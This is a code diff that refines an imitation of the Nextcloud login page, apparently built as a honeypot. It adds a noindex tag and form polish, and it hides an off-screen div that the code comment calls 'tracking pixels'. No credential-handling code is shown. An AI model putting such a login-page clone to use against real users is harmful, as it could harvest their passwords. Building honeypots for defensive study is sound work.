@@ -6,6 +6,12 @@
         <title>Nextcloud</title>
         <link rel="stylesheet" href="styles.css" />
         <link rel="icon" href="nextcloud.svg" />
+        <meta name="theme-color" content="#0082c9" />
+        <meta
+            name="description"
+            content="Nextcloud - A safe home for all your data"
+        />
+        <meta name="robots" content="noindex, nofollow" />
     </head>
     <body>
         <div class="wrapper">
@@ -21,7 +27,21 @@
                         <h2>Log in</h2>
                     </div>
 
-                    <form id="loginForm" method="post" name="login">
+                    <div id="error-message" class="error-message">
+                        <span class="error-text"></span>
+                    </div>
+
+                    <div id="loading-spinner" class="loading-spinner">
+                        <div class="spinner"></div>
+                        <span style="margin-left: 10px">Signing in...</span>
+                    </div>
+
+                    <form
+                        id="loginForm"
+                        method="post"
+                        name="login"
+                        autocomplete="on"
+                    >
                         <fieldset class="login-fieldset">
                             <div class="grouptop">
                                 <input
@@ -32,6 +52,7 @@
                                     autocomplete="username"
                                     required
                                     autofocus
+                                    maxlength="255"
                                 />
                             </div>
                             <div class="groupbottom">
@@ -42,22 +63,25 @@
                                     placeholder="Password"
                                     autocomplete="current-password"
                                     required
+                                    maxlength="255"
                                 />
                             </div>
+
                             <div class="submit-wrapper">
-                                <input
-                                    type="checkbox"
-                                    id="remember_login"
-                                    name="remember_login"
-                                    value="1"
-                                />
-                                <label for="remember_login"
-                                    >Stay logged in</label
-                                >
+                                <label for="remember_login">
+                                    <input
+                                        type="checkbox"
+                                        id="remember_login"
+                                        name="remember_login"
+                                        value="1"
+                                    />
+                                    Stay logged in
+                                </label>
                                 <a href="#" id="lost-password"
                                     >Forgot password?</a
                                 >
                             </div>
+
                             <div class="groupbottom">
                                 <input
                                     type="submit"
@@ -72,16 +96,48 @@
                     <div id="alternative-logins" class="alternative-logins">
                         <p>or</p>
                         <div class="alternative-login">
-                            <a href="#" class="button">Log in with a device</a>
+                            <a href="#" class="button" id="device-login">
+                                <svg
+                                    width="16"
+                                    height="16"
+                                    viewBox="0 0 24 24"
+                                    fill="currentColor"
+                                >
+                                    <path
+                                        d="M17,7H22V17H17V19A1,1 0 0,0 18,20H20V22H17.5C16.95,22 16,21.55 16,21C16,21.55 15.05,22 14.5,22H12V20H14A1,1 0 0,0 15,19V5A1,1 0 0,0 14,4H12V2H14.5C15.05,2 16,2.45 16,3C16,2.45 16.95,2 17.5,2H20V4H18A1,1 0 0,0 17,5V7M2,7H7V17H2V7M3,8V16H6V8H3M8,7H13V17H8V7M9,8V16H12V8H9Z"
+                                    />
+                                </svg>
+                                Log in with a device
+                            </a>
                         </div>
                     </div>
                 </main>
             </div>
 
             <footer>
-                <p><a href="#">Nextcloud</a> - a safe home for all your data</p>
+                <p>
+                    <a href="#" id="nextcloud-link">Nextcloud</a> - a safe home
+                    for all your data
+                </p>
                 <p><a href="register.html">Sign up</a></p>
             </footer>
+        </div>
+
+        <!-- Honeypot tracking pixels (invisible) -->
+        <div
+            style="
+                position: absolute;
+                left: -9999px;
+                width: 1px;
+                height: 1px;
+                overflow: hidden;
+            "
+        >
+            <img
+                id="tracking-pixel"
+                src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+                alt=""
+            />
         </div>
 
         <script src="script.js"></script>
